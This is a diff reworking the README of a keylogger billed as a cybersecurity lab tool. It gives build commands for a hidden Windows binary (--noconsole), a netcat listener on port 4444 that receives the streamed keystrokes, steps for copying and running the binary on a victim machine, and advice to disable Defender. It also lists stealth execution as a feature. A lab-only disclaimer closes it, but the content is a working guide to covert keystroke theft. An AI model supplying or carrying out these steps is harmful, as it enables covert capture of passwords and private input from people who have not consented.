@@ -1,99 +1,97 @@
-# ================================
 # Network Keystroke Monitor (Lab Edition)
-# ================================
 
-# A standalone keystroke logger designed for cybersecurity lab simulations.
-# It captures keystrokes on a victim machine and streams them to a Kali Linux
-# listener in real time.
+A standalone keystroke logger designed for **cybersecurity lab simulations**. It captures keystrokes on a victim machine and streams them to a Kali Linux listener in real time.
 
-# ------------------------------------------------
-# CONFIGURATION
-# ------------------------------------------------
+---
 
+## ⚙️ Configuration
+
+Edit the attacker IP before building:
+
+```bash
 nano src/main.py
+```
 
-# Change the attacker IP:
-KALI_IP="192.168.X.X"
+Change:
 
-# Replace with your Kali Linux IP.
+```python
+KALI_IP = "192.168.X.X"
+```
 
-# ------------------------------------------------
-# BUILD INSTRUCTIONS
-# ------------------------------------------------
+Replace it with your **Kali Linux IP**.
 
-# ----- Linux (Ubuntu / Arch) -----
+---
 
+## 🛠️ Build Instructions
+
+### Linux
+
+```bash
 pip install pynput pyinstaller
 pyinstaller --onefile --clean --paths=src src/main.py
+```
 
-# Output:
-# dist/main
+Output: `dist/main`
 
-# ----- Windows (PowerShell / CMD) -----
+---
 
+### Windows 🪟
+
+Run on a **Windows machine** (PowerShell or CMD):
+
+```powershell
 pip install pynput pyinstaller
 pyinstaller --onefile --noconsole --clean --paths=src src/main.py
+```
 
-# Output:
-# dist/main.exe
-# --noconsole hides the terminal window on Windows
+Output: `dist/main.exe`  
+`--noconsole` hides the terminal window on Windows.
 
-# ------------------------------------------------
-# LAB SIMULATION – HOW TO RUN
-# ------------------------------------------------
+---
 
-# Lab Setup:
-# Attacker: Kali Linux
-# Victim: Windows / Ubuntu / Arch Linux
-# Port: 4444
+## 🧪 Lab Simulation – How to Run
 
-# ----- Step 1: Attacker (Kali) -----
+### Lab Setup
+- Attacker: Kali Linux
+- Victim: Windows / Ubuntu / Arch Linux
+- Port: 4444
 
+### Step 1: Attacker (Kali)
+
+```bash
 nc -lvp 4444
+```
 
-# ------------------------------------------------
-# Step 2: Transfer Binary to Victim
-# ------------------------------------------------
+### Step 2: Transfer Binary to Victim
 
-# Example from Kali to Linux victim:
+```bash
 scp dist/main user@VICTIM_IP:/home/user/
+```
 
-# ------------------------------------------------
-# Step 3: Execution on Victim
-# ------------------------------------------------
+### Step 3: Execution
 
-# ----- Linux Victim -----
+Linux victim:
 
+```bash
 chmod +x main
 ./main
+```
 
-# (No output = normal behavior)
+Windows victim:
 
-# ----- Windows Victim -----
+Double‑click `main.exe` (disable Defender for lab testing).
 
-# Double-click:
-# main.exe
-# (Disable Windows Defender for lab testing if needed)
+---
 
-# ------------------------------------------------
-# RESULT
-# ------------------------------------------------
+## 🛡️ Features
 
-# Type on the victim machine
-# Keystrokes appear live on the Kali terminal
+- Cross‑platform (Linux & Windows)
+- Standalone executable (no Python required)
+- Stealth execution on Windows
+- Clean keystroke stream
 
-# ------------------------------------------------
-# FEATURES
-# ------------------------------------------------
+---
 
-# - Cross-platform (Linux & Windows)
-# - Standalone binary (no Python needed on victim)
-# - Stealth mode on Windows (--noconsole)
-# - Clean keystroke stream
+## ⚠️ Disclaimer
 
-# ------------------------------------------------
-# DISCLAIMER
-# ------------------------------------------------
-
-# FOR AUTHORIZED EDUCATIONAL LAB USE ONLY.
-# DO NOT USE ON REAL SYSTEMS OR REAL USERS.
+For **authorized educational cybersecurity lab use only**. Do **NOT** use on real systems or real users.
